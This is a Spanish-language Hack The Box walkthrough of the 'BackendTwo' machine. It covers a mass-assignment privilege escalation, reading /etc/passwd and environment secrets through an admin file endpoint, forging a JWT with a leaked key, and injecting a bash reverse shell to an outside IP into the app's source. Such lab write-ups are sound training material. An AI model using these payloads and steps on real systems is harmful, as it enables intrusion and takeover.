---
layout: single
title: Backendtwo - Hack The Box
excerpt: "Segunda version de Backend"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-backend/backendtwo1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - APIs
---

# 10.10.11.162 - BackendTwo

![](/assets/images/htb-backend/backendtwo1.png)

-------------------------

# Part 1: Reconocieminto

Puertos abiertos -> 22(ssh), 80(http)
Vamos a empezar con el reconocimiento y fuzzing.
```console
└─$ whatweb http://10.10.11.162
http://10.10.11.162 [200 OK] Country[RESERVED][ZZ], HTTPServer[uvicorn], IP[10.10.11.162]
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.162/FUZZ/
000000076:   307        0 L      0 W        0 Ch        "docs"                                               
000001012:   307        0 L      0 W        0 Ch        "api"
```
La api solo tiene un directorio -> /v1

```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.162/api/v1/FUZZ/
000000245:   401        0 L      2 W        30 Ch       "admin"
# Por POST sale lo mismo
└─$ curl -s http://10.10.11.162/docs # -> {"detail":"Not authenticated"}  
└─$ curl -s http://10.10.11.162/api/v1  # -> {"endpoints":["/user","/admin"]} 
└─$ for i in $(seq 1 11); do curl -s http://10.10.11.162/api/v1/user/$i; echo; done
{"guid":"25d386cd-b808-4107-8d3a-4277a0443a6e","email":"admin@backendtwo.htb","profile":"UHC Admin","last_update":null,"time_created":1650987800991,"is_superuser":true,"id":1}
{"guid":"89c0b058-2ae2-49f8-bb07-5e8dcb2d196c","email":"guest@backendtwo.htb","profile":"UHC Guest","last_update":null,"time_created":1650987817546,"is_superuser":false,"id":2}...
# Hasta 15 usuarios
```
Por ahora la máquina es identica a la Backend.
```console
└─$ wfuzz -c -X POST --hl=307 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.162/api/v1/user/FUZZ
000000203:   422        0 L      2 W        81 Ch       "signup"
000000039:   422        0 L      3 W        172 Ch      "login"
```
-------------------------
# Part 2: Creacion de un usaurio

Como en la anterior, vamos a crear un usaurio, siguiendo los pasos como nos dicen:
```console
└─$ curl -s -X POST http://10.10.11.162/api/v1/user/signup -H "Content-Type: application/json" -d '{"email":"cucuxii@backendtwo.htb", "password":"cucucxii123"}' | jq  # -> {}
└─$ curl -s -X POST http://10.10.11.162/api/v1/user/login -d "username=cucuxii@backendtwo.htb&password=cucucxii123" | jq  
{ "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjUzNTQ2LCJpYXQiOjE2Njc1NjIzNDYsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6Ijg5ZTc4OGY4LWQ3YTAtNDZjNi05NjBhLTVjZmIzOGViZDIxNyJ9.sjyNPdoQ6xP0zWKoBUfnKZCNdQnUxJ1YL5i2_FPYAN8",  "token_type": "bearer" }
```
Al igual que en la primera **backend** tenemos un directorio /docs al que se accederá por navegador añadiendo el header del **Authorization: bearer** 
con el [plugin](https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/)

![](/assets/images/htb-backend/backendtwo2.PNG)

Al igual que la anterior maquina hay un directorio openapi.json con todas las rutas, puede que haya información interesante.
```console
└─$ curl -X 'GET' \
  'http://10.10.11.162/openapi.json' \
  -H 'accept: application/json' \
  -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | jq > openapi.json
```
En openapi son curiosas ciertas lineas:
```
"/api/v1/admin/file/{file_name}": {
	"description": "Returns a file on the server. File name input is encoded in base64_url",
```
Probé el endpoint de editar contraseña, pero me devolvió un 403 bad requests. 

-------------------------
# Part 3: Elevando privilegios con un Mass assignment attack

- Este es mi usaurio
```
{"guid":"89e788f8-d7a0-46c6-960a-5cfb38ebd217","email":"cucuxii@backendtwo.htb","profile":null,"last_update":null,"time_created":1667562252633,"is_superuser":false,"id":12}
```
- Este es el admin
```
{"guid":"25d386cd-b808-4107-8d3a-4277a0443a6e","email":"admin@backendtwo.htb","profile":"UHC Admin","last_update":null,"time_created":1650987800991,"is_superuser":true,"id":1}
```
Lo que cambia principalmente es el parámetro **is_superuser**. 
Tenemos un endpoint para cambiar cosas del perfil, vamos a tocar el nuestro:
```console
curl -X 'PUT' 'http://10.10.11.162/api/v1/user/12/edit' \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -d '{ "profile": "Test" }'
└─$ curl -s http://10.10.11.162/api/v1/user/12
{"guid":"89e788f8-d7a0-46c6-960a-5cfb38ebd217","email":"cucuxii@backendtwo.htb","profile":"Test","last_update":null,"time_created":1667562252633,"is_superuser":false,"id":12}  
```
Ahora el campo profile que es el que nos han dado, se ha cambiado a "Test", como he dicho ese campo NOS LO HAN DADO, pero ¿Y si metemos otro paŕametro
de cosecha propia? La diferencia entre el admin y nosotros es lo de **is_superuser**. Así que podríamos probar a meterlo

![](/assets/images/htb-backend/backendtwo3.PNG)

```console
curl -X 'PUT' 'http://10.10.11.162/api/v1/user/12/edit' \
  -H 'accept: application/json' -H 'Content-Type: application/json' \
  -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." -d '{ "profile": "Test","is_superuser": true}'
└─$ curl -s http://10.10.11.162/api/v1/user/12 
{"guid":"89e788f8-d7a0-46c6-960a-5cfb38ebd217","email":"cucuxii@backendtwo.htb","profile":"Test","last_update":null,"time_created":1667562252633,"is_superuser":true,"id":12} 
```
Como vemos, el campo **is_superuser** se ha actualizado. Esto es un **MASS ASSGINMENT ATTACK**, un ataque donde te permiten modificar algo (profile) 
y tu modificas más cosas de las esperadas (is_superuser).
Nuestra cookie tambien es diferente.
```console
└─$ curl -s -X POST http://10.10.11.162/api/v1/user/login -d "username=cucuxii@backendtwo.htb&password=cucucxii123" {"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NzExLCJpYXQiOjE2Njc1NjQ1MTEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3In0.HR5JRYccC8mR5apNvr0frjMjDlwXlNLQZ_txnJnkq5g","token_type":"bearer"}
```
Ahora actualizamos el header en el navegador:
```console
└─$ curl -s -X GET http://10.10.11.162/api/v1/admin/ -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6Ik..." # -> {"results":true}
```
Si, en efecto somos un superusaurio.

-------------------------
# Part 4: Leyendo archivos de la máquina

Hay un endpoint que permite leer la flag del usaurio, pero la respuesta es diferente al de la máquina anterior.
```console
└─$ curl -X 'GET' 'http://10.10.11.162/api/v1/admin/get_user_flag' \
  -H 'accept: application/json' -H "Authorization: bearer 
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3In0.8N5hggb5u-NdfZLYLUHxvpmR6w5j3c5VKEipM7VD-2c"
{"file":"918ab951ec1f2e6f7e948cea7c889e34\n"}
```
No es una flag sino algo un poco raro, encima nos meten un salto de linea al final...
Si lo decodificamos en base64 o en hexadecimal salen caracteres sin sentido.
Este numero raro parece un md5sum del user.txt ```md5sum Backendtwo.md # -> 6b02f163d0984afcc4ea98b2685a2e92  Backendtwo.md```

Nos dan tambien un endpoint para leer archivos de la máquina. Meto **/etc/passwd** que se queda así ```http://10.10.11.162/api/v1/admin/file/%2Fetc%2Fpasswd```

![](/assets/images/htb-backend/backendtwo4.PNG)

Recordamos la linea que leímos en el openapi.json:
```"description": "Returns a file on the server. File name input is encoded in base64_url"```
El archivo /etc/passwd en base64 sin salto de linea es asi ```echo -n "/etc/passwd" | base64 # -> L2V0Yy9wYXNzd2Q=```
Si ponemos eso en la web nos devuelve el /etc/passwd, pero la url nos sale como 
```http://10.10.11.162/api/v1/admin/file/L2V0Yy9wYXNzd2Q%3D```, es decir nos urlencodea el "=" a "%3D"
```console
#!/bin/bash
bearer="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3In0.8N5hggb5u-NdfZLYLUHxvpmR6w5j3c5VKEipM7VD-2c"

file=$1
file64="$(echo -n $file | base64)"  # el archivo sin el "=" que equivale al salto de linea y da problemas en url
curl -s -X GET "http://10.10.11.162/api/v1/admin/file/$file64" -H 'accept: application/json' \
-H "Authorization: bearer $bearer" | sed 's/\\n/\n/g' | sed 's/\\u0000/\n/g' ; echo
```
```console
└─$ ./files.sh /etc/passwd | grep "sh$"
{"file":"root:x:0:0:root:/root:/bin/bash
htb:x:1000:1000:htb:/home/htb:/bin/bash # Usuarios del sistema
└─$ for port in $(./files.sh /proc/net/tcp | awk '{print $2}' | awk '{print $2}' FS=":"); do echo "$((16#$port))" | tr "\n" ","; done 
80,53,22,52242,52240,52248,44026,52250,80 # Puertos abiertos
└─$ ./files.sh /proc/net/fib_trie | grep "LOCAL" -B 1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | tr "\n" ","
10.10.11.162,127.0.0.1 # Interfaces abiertas, no hay contenedores
└─$ ./files.sh /proc/self/environ
HOME=/home/htb
APP_MODULE=app.main:app
PWD=/home/htb
API_KEY=68b329da9893e34099c7d8ad5cb9c940
```
Igual que en la maquina anterior :V
```console
└─$ ./files.sh /home/htb/app/main.py > main.py
# Tenemos estas rutas
from app.schemas.user import User # -> /app/schemas/user.py 
from app.api.v1.api import api_router # -> nos lleva a /home/htb/app/api/v1/endpoints/user.py 
from app.core.config import settings # -> /app/core/config.py
from app.api import deps
from app import crud 
```
No existe la ruta de ejecutar comandos pero si hay otra pera escribir archivos.
Sabemos por las varaibles que estamos en **/home/htb/** y ahí existe **/app/** que tiene el codigo fuente de la api como **main.py**. Aquí nos dicen 
que esto está en base64 también, Imaginemos el archivo /home/htb/test.
```console
└─$ curl -X 'POST' 'http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL3Rlc3Q%3D' \
  -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"file": "Test"}' \
  -H "Authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ..."
{"detail":"Debug key missing from JWT"}
```
Tenemos la key de la api para poder crear la cookie que nos de la gana. 
```
>>> import jwt
>>> token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3In0.8N5hggb5u-NdfZLYLUHxvpmR6w5j3c5VKEipM7VD-2c"
>>> secret = "68b329da9893e34099c7d8ad5cb9c940"
>>> cookie = jwt.decode(token, secret, ["HS256"])
>>> cookie["debug"] = True
>>> jwt.encode(cookie, secret, "HS256")
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A'
```
Cambiamos la cookie

-------------------------
# Part 5: Sobreescribiendo el código fuente

Como seria /home/htb/Test ? ```echo -n "/home/htb/test" | base64 -w0 | tr -d "=" # -> L2hvbWUvaHRiL3Rlc3Q=```
```console
└─$ curl -X 'POST' 'http://10.10.11.162/api/v1/admin/file/L2hvbWUvaHRiL3Rlc3Q%3D' \
  -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"file": "Test"}' \
  -H "Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A"
{"result":"success"}
└─$ ./files.sh /home/htb/test # -> {"file":"Test"} 
```
Es script de antes lo modificamos ligeramente para crear writting.sh (un script para escritura):
```bash
#!/bin/bash
bearer="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A"

curl -X 'POST' "http://10.10.11.162/api/v1/admin/file/$(echo -n $1 | base64 -w0)" -H 'accept: application/json' -H 'Content-Type: application/json' -d '{"file": "ESto es una prueba"}' -H "Authorization: bearer $bearer"; echo

./files.sh $1
```
```console
└─$ ./writting.sh /home/htb/test
{"result":"success"}
{"file":"Esto es una prueba"}
```

Intenté meter mi clave publica id_rsa.pub en known hosts pero no hubo suerte. (Puse en la parte de data la llave) y en la ruta **/home/htb/.ssh/known_hosts**.
Lo unico que queda es que como tenemos es codigo fuente, meter una linea de reverse shell en el y sobreescribirlo con el tema de subida de archivos. 

Tenemos que escribir a una ruta a la que luego podamos acceder. Por ejemplo un usuario -> ```http://10.10.11.162/api/v1/user/666```
El archivo de los tres que determina esto es ```/home/htb/app/api/v1/endpoints/user.py```
```python
@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)
    if user_id == -666:
        import os; os.system('bash -c "bash -i >& /dev/tcp/10.10.14.12/443 0>&1"')
```
El marron esque hay que subir esto con curl en data. Es decir hay que trasnformar todo el contenido en un one-liner que meter dentro de un enorme curl
Abri el user.py modificado con vim y aplique estos comandos:
```
:%s/"/\\"/g # -> Sustituye la " por \" (o sea escápala)
:%s/'/'\\''/g # -> la comilla simple como da mas probelmas mejor asi ->  '\''
:%s/\n/\\n/g # -> el salto de linea por un caracter de salto de linea
```
Con todo eso queda en un oneliner, el archivo se llamaria
```echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64 # -> L2hvbWUvaHRiL2FwcC9hcGkvdjEvZW5kcG9pbnRzL3VzZXIucHk=```

![](/assets/images/htb-backend/backendtwo5.PNG)

El resultado del one liner seria este:
```
curl http://10.10.11.162/api/v1/admin/file/$(echo -n "/home/htb/app/api/v1/endpoints/user.py" | base64) -H 'Content-Type: application/json' -d '{"file": "from typing import Any, Optional\nfrom uuid import uuid4\nfrom datetime import datetime\n\n\nfrom fastapi import APIRouter, Depends, HTTPException, Query, Request\nfrom fastapi.security import OAuth2PasswordRequestForm\nfrom sqlalchemy.orm import Session\n\nfrom app import crud\nfrom app import schemas\nfrom app.api import deps\nfrom app.models.user import User\nfrom app.core.security import get_password_hash\n\nfrom pydantic import schema\ndef field_schema(field: schemas.user.UserUpdate, **kwargs: Any) -> Any:\n    if field.field_info.extra.get(\"hidden_from_schema\", False):\n        raise schema.SkipField(f\"{field.name} field is being hidden\")\n    else:\n        return original_field_schema(field, **kwargs)\n\noriginal_field_schema = schema.field_schema\nschema.field_schema = field_schema\n\nfrom app.core.auth import (\n    authenticate,\n    create_access_token,\n)\n\nrouter = APIRouter()\n\n@router.get(\"/{user_id}\", status_code=200, response_model=schemas.User)\ndef fetch_user(*, \n    user_id: int, \n    db: Session = Depends(deps.get_db) \n    ) -> Any:\n    \"\"\"\n    Fetch a user by ID\n    \"\"\"\n    if user_id == 666:\n        import os; os.system('\''bash -c \"bash -i >& /dev/tcp/10.10.14.12/443 0>&1\"'\'')\n    result = crud.user.get(db=db, id=user_id)\n    return result\n\n\n@router.put(\"/{user_id}/edit\")\nasync def edit_profile(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.UserUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Edit the profile of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.put(\"/{user_id}/password\")\nasync def edit_password(*,\n    db: Session = Depends(deps.get_db),\n    token: User = Depends(deps.parse_token),\n    new_user: schemas.user.PasswordUpdate,\n    user_id: int\n) -> Any:\n    \"\"\"\n    Update the password of a user\n    \"\"\"\n    u = db.query(User).filter(User.id == token['\''sub'\'']).first()\n    if token['\''is_superuser'\''] == True:\n        crud.user.update(db=db, db_obj=u, obj_in=new_user)\n    else:        \n        u = db.query(User).filter(User.id == token['\''sub'\'']).first()        \n        if u.id == user_id:\n            crud.user.update(db=db, db_obj=u, obj_in=new_user)\n            return {\"result\": \"true\"}\n        else:\n            raise HTTPException(status_code=400, detail={\"result\": \"false\"})\n\n@router.post(\"/login\")\ndef login(db: Session = Depends(deps.get_db),\n    form_data: OAuth2PasswordRequestForm = Depends()\n) -> Any:\n    \"\"\"\n    Get the JWT for a user with data from OAuth2 request form body.\n    \"\"\"\n    \n    timestamp = datetime.now().strftime(\"%m/%d/%Y, %H:%M:%S\")\n    user = authenticate(email=form_data.username, password=form_data.password, db=db)\n    if not user:\n        with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Failure for {form_data.username}\\n\")\n        raise HTTPException(status_code=400, detail=\"Incorrect username or password\")\n    \n    with open(\"auth.log\", \"a\") as f:\n            f.write(f\"{timestamp} - Login Success for {form_data.username}\\n\")\n\n    return {\n        \"access_token\": create_access_token(sub=user.id, is_superuser=user.is_superuser, guid=user.guid),\n        \"token_type\": \"bearer\",\n    }\n\n@router.post(\"/signup\", status_code=201)\ndef create_user_signup(\n    *,\n    db: Session = Depends(deps.get_db),\n    user_in: schemas.user.UserSignup,\n) -> Any:\n    \"\"\"\n    Create new user without the need to be logged in.\n    \"\"\"\n\n    new_user = schemas.user.UserCreate(**user_in.dict())\n\n    new_user.guid = str(uuid4())\n\n    user = db.query(User).filter(User.email == new_user.email).first()\n    if user:\n        raise HTTPException(\n            status_code=400,\n            detail=\"The user with this username already exists in the system\",\n        )\n    user = crud.user.create(db=db, obj_in=new_user)\n\n    return user\n\n"}' -H 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjY4MjU1NjY3LCJpYXQiOjE2Njc1NjQ0NjcsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiODllNzg4ZjgtZDdhMC00NmM2LTk2MGEtNWNmYjM4ZWJkMjE3IiwiZGVidWciOnRydWV9.NPicg25nww0_6-F5yUY_ox6PYSLxLb_-WPqflTQZG5A'
```

-------------------------
# Part 6: Dentro del sistema

Una vez en el sistema, al igual que la máquina anterior, en la carpeta principal hay un auth.log con una contraseña que nos permitiría conectarnos
como el usuario actual por ssh ```1qaz2wsx_htb!```
Una vez dentro de la máquina, si haces ```sudo -l``` y pones la contraseña te sale un juego del wordle
```console
  >  SUDO NO PASSWD
[sudo] password for htb:
--- Welcome to PAM-Wordle! ---

A five character [a-z] word has been selected.
You have 6 attempts to guess the word.

After each guess you will recieve a hint which indicates:
? - what letters are wrong.
* - what letters are in the wrong spot.
[a-z] - what letters are correct.

--- Attempt 1 of 6 ---
Word: testing
Invalid guess: guess length != word length.
```

Buscando **pam-wordle** en google sale su repo en github. Dice que es un modo de autenticación via wordle (juego de adivinar palabras), que su archivo 
de configuracion es **/etc/pam.d** y que tira del diccionario **/usr/share/dict/words** El ultimo no existe en la máquina.

Hay un archivo que se menciona en el repo llamada /etc/pam.d/sudo que habla de pam_wordle.so y pam_unix.so
```console
htb@BackendTwo:/etc/pam.d$ find / -name pam_unix.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
htb@BackendTwo:/etc/pam.d$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so
# nada interesante
htb@BackendTwo:/etc/pam.d$ find / -name pam_wordle.so 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_wordle.so
htb@BackendTwo:/etc/pam.d$ strings /usr/lib/x86_64-linux-gnu/security/pam_wordle.so | grep "/"
/opt/.words
```
Este archivo contiene 74 palabras de cinco letras. Si no existe la letra es un ?, si existe en otra posicion es *

```console
--- Attempt 1 of 6 ---
Word: union
Hint->?????
└─$ cat words.txt | grep -vE "u|n|i|o" # -> nos quedamos en 24 palabras sin esas letras
Word: cheat
Hint->?he??
└─$ cat words.txt | grep -vE "u|n|i|o|c|a|t" | grep -E "h|e"
Word: shell
Hint->?he?l
...
Al final la palabra es wheel, pero cada vez que se juega cambia
User htb may run the following commands on backendtwo:
    (ALL : ALL) ALL
```
O sea **sudo su** y ya tenemos al root.



